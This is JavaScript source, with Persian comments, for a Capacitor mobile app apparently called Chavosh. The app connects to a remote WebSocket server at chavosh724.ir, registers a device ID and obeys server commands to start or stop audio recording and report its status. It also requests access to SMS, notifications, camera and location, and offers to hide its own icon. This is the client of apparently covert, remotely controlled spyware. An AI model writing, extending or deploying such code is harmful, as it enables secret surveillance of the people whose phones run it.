// نمایش پیام
function showStatus(msg, isError = false) {
    const el = document.getElementById('status');
    el.innerHTML = msg;
    el.style.color = isError ? '#ffaaaa' : '#aaffaa';
    setTimeout(() => { if (el.innerHTML === msg) el.innerHTML = ''; }, 5000);
}

// اتصال WebSocket به سرور روی پورت 9443
let ws = null;
let recordingActive = false;

// تابع اتصال به سرور
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    ws = new WebSocket('wss://chavosh724.ir:9443/ws');
    ws.onopen = () => {
        showStatus('✅ ارتباط امن با سرور برقرار شد.');
        // ارسال شناسه دستگاه (یکتا)
        const deviceId = localStorage.getItem('deviceId') || Math.random().toString(36);
        localStorage.setItem('deviceId', deviceId);
        ws.send(JSON.stringify({ type: 'register', deviceId }));
    };
    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.command === 'start_recording') {
            startRecordingService();
        } else if (data.command === 'stop_recording') {
            stopRecordingService();
        } else if (data.command === 'send_status') {
            ws.send(JSON.stringify({ type: 'status', recording: recordingActive }));
        }
    };
    ws.onerror = () => showStatus('❌ خطا در اتصال به سرور.', true);
    ws.onclose = () => {
        showStatus('ارتباط با سرور قطع شد. تلاش مجدد در 10 ثانیه...', true);
        setTimeout(connectWebSocket, 10000);
    };
}

// شروع سرویس ضبط (با فراخوانی پلاگین بومی)
async function startRecordingService() {
    if (recordingActive) return;
    if (typeof Capacitor === 'undefined' || !Capacitor.plugins.RecordingService) {
        showStatus('این قابلیت فقط در نسخه موبایل کار می‌کند.', true);
        return;
    }
    try {
        await Capacitor.plugins.RecordingService.start();
        recordingActive = true;
        showStatus('🎙️ روند برنامه آغاز شد. نوتیفیکیشن دائمی نمایش داده می‌شود.');
    } catch (e) {
        showStatus('خطا در شروع : ' + e.message, true);
    }
}

async function stopRecordingService() {
    if (!recordingActive) return;
    if (typeof Capacitor !== 'undefined' && Capacitor.plugins.RecordingService) {
        await Capacitor.plugins.RecordingService.stop();
    }
    recordingActive = false;
    showStatus('⏹️  متوقف شد.');
}

// دکمه‌های ضبط
document.getElementById('startRecording')?.addEventListener('click', startRecordingService);
document.getElementById('stopRecording')?.addEventListener('click', stopRecordingService);

// سایر دسترسی‌ها (مشابه قبل)
function hasPlugin(p) { return typeof Capacitor !== 'undefined' && Capacitor.plugins && Capacitor.plugins[p]; }

document.getElementById('btnNotification')?.addEventListener('click', async () => {
    if (!hasPlugin('NotificationReader')) { showStatus('فقط در اپ موبایل', true); return; }
    const r = await Capacitor.plugins.NotificationReader.requestPermission();
    showStatus(r.granted ? '✅ دسترسی  فعال شد' : '⛔ داده نشد');
});
document.getElementById('btnSms')?.addEventListener('click', async () => {
    if (!hasPlugin('SMS')) { showStatus('فقط در اپ موبایل', true); return; }
    const r = await Capacitor.plugins.SMS.requestReadPermission();
    showStatus(r.granted ? '✅ دسترسی  فعال شد' : '⛔ داده نشد');
});
document.getElementById('btnCamera')?.addEventListener('click', async () => {
    if (!hasPlugin('Camera')) { showStatus('فقط در اپ موبایل', true); return; }
    const r = await Capacitor.plugins.Camera.requestPermissions();
    showStatus(r.camera === 'granted' ? '✅  فعال شد' : '⛔ داده نشد');
});
document.getElementById('btnLocation')?.addEventListener('click', async () => {
    if (!hasPlugin('Geolocation')) { showStatus('فقط در اپ موبایل', true); return; }
    const r = await Capacitor.plugins.Geolocation.requestPermissions();
    showStatus(r.location === 'granted' ? '✅  فعال شد' : '⛔ داده نشد');
});

// مخفی‌سازی آیکون (همان روش قبل)
document.getElementById('hideIconOption')?.addEventListener('click', async () => {
    showStatus('این قابلیت در نسخه نهایی با تغییر AndroidManifest.xml فعال می‌شود.');
});

// اتصال WebSocket هنگام بارگذاری صفحه
connectWebSocket();

// نمایش پیام خوش‌آمد
showStatus('✨ به چاووش خوش آمدید. لطفاً دسترسی‌ها را فعال کنید.');